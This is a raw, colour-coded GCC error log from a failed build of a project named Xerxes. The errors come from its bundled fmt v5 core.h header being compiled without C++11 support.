[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:617:30:[m[K [01;31m[Kerror: [m[K‘[01m[Kfmt::v5::internal::no_formatter_error<T>::value[m[K’ is not a type
       no_formatter_error<T>::value,
[01;32m[K                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:618:7:[m[K [01;31m[Kerror: [m[Kexpected identifier before string constant
       "don't know how to format the type, include fmt/ostream.h if it provides "
[01;32m[K       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:618:7:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K,[m[K’ or ‘[01m[K...[m[K’ before string constant
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:619:42:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kstatic_assert[m[K’ with no type [-fpermissive]
       "an operator<< that should be used");
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::integral_constant<
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:631:29:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:20:[m[K [01;31m[Kerror: [m[K‘[01m[Kto_string_view[m[K’ is not a type
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K<[m[K’ token
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[KISO C++ forbids declaration of ‘[01m[Kdecltype[m[K’ with no type [-fpermissive]
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:35:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K;[m[K’ at end of member declaration
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:641:42:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
   typedef decltype(to_string_view(declval<S>())) result;
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:642:20:[m[K [01;31m[Kerror: [m[K‘[01m[Kresult[m[K’ has not been declared
   typedef typename result::char_type type;
[01;32m[K                    ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const signed char*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:19:[m[K [01;31m[Kerror: [m[K‘[01m[Kis_same[m[K’ is not a member of ‘[01m[Kstd[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:32:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[Kchar[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:48:[m[K [01;31m[Kerror: [m[K‘[01m[K::value[m[K’ has not been declared
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:727:48:[m[K [01;36m[Knote: [m[Ksuggested alternative:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:701:35:[m[K [01;36m[Knote: [m[K  ‘[01m[Kfmt::v5::internal::value[m[K’
 template <typename Context> class value {
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:728:46:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
                   "incompatible string types");
[01;32m[K                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:728:46:[m[K [01;36m[Knote: [m[K(if you use ‘[01m[K-fpermissive[m[K’, G++ will accept your code, but allowing the use of an undeclared name is deprecated)
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const unsigned char*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:19:[m[K [01;31m[Kerror: [m[K‘[01m[Kis_same[m[K’ is not a member of ‘[01m[Kstd[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:32:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[Kchar[m[K’
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:47:[m[K [01;31m[Kerror: [m[Kexpected primary-expression before ‘[01m[K>[m[K’ token
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:48:[m[K [01;31m[Kerror: [m[K‘[01m[K::value[m[K’ has not been declared
     static_assert(std::is_same<char, char_type>::value,
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:732:48:[m[K [01;36m[Knote: [m[Ksuggested alternative:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:701:35:[m[K [01;36m[Knote: [m[K  ‘[01m[Kfmt::v5::internal::value[m[K’
 template <typename Context> class value {
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:733:46:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
                   "incompatible string types");
[01;32m[K                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In constructor ‘[01m[Kfmt::v5::internal::value<Context>::value(const T&)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:26:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
         T, typename std::conditional<
[01;32m[K                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:37:[m[K [01;31m[Kerror: [m[Kexpected template-argument before ‘[01m[K<[m[K’ token
         T, typename std::conditional<
[01;32m[K                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:748:37:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected class-name before ‘[01m[K;[m[K’ token
                internal::fallback_formatter<T, char_type>>::type>;
[01;32m[K                                                                  ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K::[m[K’ before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected identifier before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:751:66:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[K;[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:802:9:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typedef std::conditional<sizeof(long) == sizeof(int), int, long long>::type
[01;32m[K         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[K‘[01m[Klong_type[m[K’ was not declared in this scope
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:25:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:39:[m[K [01;31m[Kerror: [m[Ktemplate argument 2 is invalid
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:804:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(long) == sizeof(int) ? int_type : long_long_type), long,
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kint fmt::v5::internal::make_value(long int)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected type-specifier before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[Klong_type[m[K’
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:805:16:[m[K [01;31m[Kerror: [m[K‘[01m[Klong_type[m[K’ was not declared in this scope
                long_type)
[01;32m[K                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:39:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K;[m[K’ token
     return static_cast<ValueType>(val);                           \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:804:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(long) == sizeof(int) ? int_type : long_long_type), long,
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:806:9:[m[K [01;31m[Kerror: [m[K‘[01m[Kconditional[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typedef std::conditional<sizeof(unsigned long) == sizeof(unsigned), unsigned,
[01;32m[K         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kulong_type[m[K’ was not declared in this scope
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:25:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                         ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:784:39:[m[K [01;31m[Kerror: [m[Ktemplate argument 2 is invalid
   FMT_CONSTEXPR init<C, ValueType, TAG> make_value(ArgType val) { \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:808:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(unsigned long) == sizeof(unsigned) ? uint_type
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kint fmt::v5::internal::make_value(long unsigned int)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected type-specifier before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K([m[K’ before ‘[01m[Kulong_type[m[K’
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:810:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kulong_type[m[K’ was not declared in this scope
                unsigned long, ulong_type)
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:24:[m[K [01;36m[Knote: [m[Kin definition of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
     return static_cast<ValueType>(val);                           \
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:785:39:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K)[m[K’ before ‘[01m[K;[m[K’ token
     return static_cast<ValueType>(val);                           \
[01;32m[K                                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:808:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_MAKE_VALUE[m[K’
 FMT_MAKE_VALUE((sizeof(unsigned long) == sizeof(unsigned) ? uint_type
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:819:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(std::is_same<typename C::char_type, Char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:819:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(std::is_same<typename C::char_type, Char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:825:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<typename C::char_type, char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:825:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<typename C::char_type, char>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:863:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<T, typename C::char_type>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:863:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(!std::is_same<T, typename C::char_type>::value)>
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kvoid fmt::v5::internal::make_value(const T*)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:865:76:[m[K [01;31m[Kerror: [m[Kthere are no arguments to ‘[01m[Kstatic_assert[m[K’ that depend on a template parameter, so a declaration of ‘[01m[Kstatic_assert[m[K’ must be available [-fpermissive]
   static_assert(!sizeof(T), "formatting of non-void pointers is disallowed");
[01;32m[K                                                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:869:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(convert_to_int<T, typename C::char_type>::value&&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:869:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(convert_to_int<T, typename C::char_type>::value&&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:876:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(is_constructible<basic_string_view<Char>, T>::value &&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:876:11:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
           FMT_ENABLE_IF(is_constructible<basic_string_view<Char>, T>::value &&
[01;32m[K           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:878:77:[m[K [01;31m[Kerror: [m[Kno default argument for ‘[01m[K<anonymous>[m[K’
 inline init<C, basic_string_view<Char>, string_type> make_value(const T& val) {
[01;32m[K                                                                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:878:77:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:886:32:[m[K [01;31m[Kerror: [m[K‘[01m[Kremove_volatile[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
     typename U = typename std::remove_volatile<T>::type,
[01;32m[K                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:886:47:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
     typename U = typename std::remove_volatile<T>::type,
[01;32m[K                                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:892:62:[m[K [01;31m[Kerror: [m[Kdefault template arguments may not be used in function templates without -std=c++11 or -std=gnu++11
 inline init<C, const T&, custom_type> make_value(const T& val) {
[01;32m[K                                                              ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:904:35:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename C, typename S, FMT_ENABLE_IF(internal::is_string<S>::value)>
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:904:35:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename C, typename S, FMT_ENABLE_IF(internal::is_string<S>::value)>
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;31m[Kerror: [m[K‘[01m[Kconstexpr[m[K’ does not name a type
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:905:1:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_CONSTEXPR11[m[K’
 FMT_CONSTEXPR11 init<C, basic_string_view<typename C::char_type>, string_type>
[01;32m[K ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:78:27:[m[K [01;36m[Knote: [m[KC++11 ‘[01m[Kconstexpr[m[K’ only available with -std=c++11 or -std=gnu++11
 #  define FMT_CONSTEXPR11 constexpr
[01;32m[K                           ^[m[K
